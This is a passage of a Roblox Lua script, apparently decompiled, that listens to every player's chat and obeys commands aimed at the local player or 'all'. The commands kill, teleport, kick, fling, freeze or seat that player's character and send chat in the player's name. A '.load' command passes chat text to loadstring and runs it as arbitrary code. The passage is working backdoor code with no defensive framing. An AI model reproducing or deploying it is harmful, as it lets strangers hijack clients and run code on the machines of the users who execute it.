			return
		end

		local v112 = parts[2]:lower()
		local v113 = LocalPlayer2.Name:lower()
		local v114 = (LocalPlayer2.DisplayName or ""):lower()
		local Humanoid = (v112 == "all" or (v113:find(v112) or v114:find(v112))) and LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChildOfClass("Humanoid")

		if not Humanoid then
			return
		end

		Humanoid.Health = 0
	elseif v110 == ".tp" then
		if not parts[2] then
			return
		end

		local v116 = parts[2]:lower()
		local v117 = LocalPlayer2.Name:lower()
		local v118 = (LocalPlayer2.DisplayName or ""):lower()

		if not ((v116 == "all" or (v117:find(v116) or v118:find(v116))) and LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("HumanoidRootPart")) then
			return
		end

		LocalPlayer2.Character:FindFirstChild("HumanoidRootPart").CFrame = HumanoidRootPart.CFrame * CFrame.new(0, 0, 5)
	elseif v110 == ".kick" then
		if not parts[2] then
			return
		end

		local v119 = parts[2]:lower()
		local v120 = #parts > 2 and table.concat(parts, " ", 3) or ""
		local v121 = LocalPlayer2.Name:lower()
		local v122 = (LocalPlayer2.DisplayName or ""):lower()

		if not (v119 == "all" or (v121:find(v119) or v122:find(v119))) then
			return
		end

		LocalPlayer2:Kick(v120)
	elseif v110 == ".chat" then
		if not (parts[2] and #parts >= 3) then
			return
		end

		local v123 = parts[2]:lower()
		local v124 = table.concat(parts, " ", 3)
		local v125 = LocalPlayer2.Name:lower()
		local v126 = (LocalPlayer2.DisplayName or ""):lower()

		if not (v123 == "all" or (v125:find(v123) or v126:find(v123))) then
			return
		end

		pcall(function()
			game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(v124, "All")
		end)
		pcall(function()
			game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(v124)
		end)
	elseif v110 == ".sit" then
		if not parts[2] then
			return
		end

		local v127 = parts[2]:lower()
		local v128 = LocalPlayer2.Name:lower()
		local v129 = (LocalPlayer2.DisplayName or ""):lower()
		local Humanoid = (v127 == "all" or (v128:find(v127) or v129:find(v127))) and LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChildOfClass("Humanoid")

		if not Humanoid then
			return
		end

		Humanoid.Sit = true
	elseif v110 == ".fling" then
		if not parts[2] then
			return
		end

		local v131 = parts[2]:lower()
		local v132 = LocalPlayer2.Name:lower()
		local v133 = (LocalPlayer2.DisplayName or ""):lower()

		if not ((v131 == "all" or (v132:find(v131) or v133:find(v131))) and LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("HumanoidRootPart")) then
			return
		end

		LocalPlayer2.Character:FindFirstChild("HumanoidRootPart").Velocity = Vector3.new(578, 99999999, 578)
	elseif v110 == ".punish" then
		if not parts[2] then
			return
		end

		local v134 = parts[2]:lower()
		local v135 = LocalPlayer2.Name:lower()
		local v136 = (LocalPlayer2.DisplayName or ""):lower()

		if not ((v134 == "all" or (v135:find(v134) or v136:find(v134))) and LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("HumanoidRootPart")) then
			return
		end

		LocalPlayer2.Character:FindFirstChild("HumanoidRootPart").CFrame = CFrame.new(9000000000, 9000000000, 9000000000)
	elseif v110 == ".freeze" then
		if not parts[2] then
			return
		end

		local v137 = parts[2]:lower()
		local v138 = LocalPlayer2.Name:lower()
		local v139 = (LocalPlayer2.DisplayName or ""):lower()

		if not ((v137 == "all" or (v138:find(v137) or v139:find(v137))) and LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("HumanoidRootPart")) then
			return
		end

		LocalPlayer2.Character.HumanoidRootPart.Anchored = true
	elseif v110 == ".unfreeze" or v110 == ".thaw" then
		if not parts[2] then
			return
		end

		local v140 = parts[2]:lower()
		local v141 = LocalPlayer2.Name:lower()
		local v142 = (LocalPlayer2.DisplayName or ""):lower()

		if not ((v140 == "all" or (v141:find(v140) or v142:find(v140))) and LocalPlayer2.Character and LocalPlayer2.Character:FindFirstChild("HumanoidRootPart")) then
			return
		end

		LocalPlayer2.Character.HumanoidRootPart.Anchored = false
	else
		if not ((v110 == ".load" or v110 == ".l") and (parts[2] and #parts >= 3)) then
			return
		end

		local v143 = parts[2]:lower()
		local v144 = table.concat(parts, " ", 3)
		local v145 = LocalPlayer2.Name:lower()
		local v146 = (LocalPlayer2.DisplayName or ""):lower()

		if not (v143 == "all" or (v145:find(v143) or v146:find(v143))) then
			return
		end

		local chunk = loadstring(v144)

		if chunk then
			pcall(chunk)
		else
			warn("error")
		end
	end
end
local function v149(player)
	player.Chatted:Connect(function(message)
		v108(player, message)
	end)
end

for _, player in pairs(Players3:GetPlayers()) do
	v149(player)
end

Players3.PlayerAdded:Connect(v149)

while true do
	v82("Annathagoodgurl")
	wait(10)
end
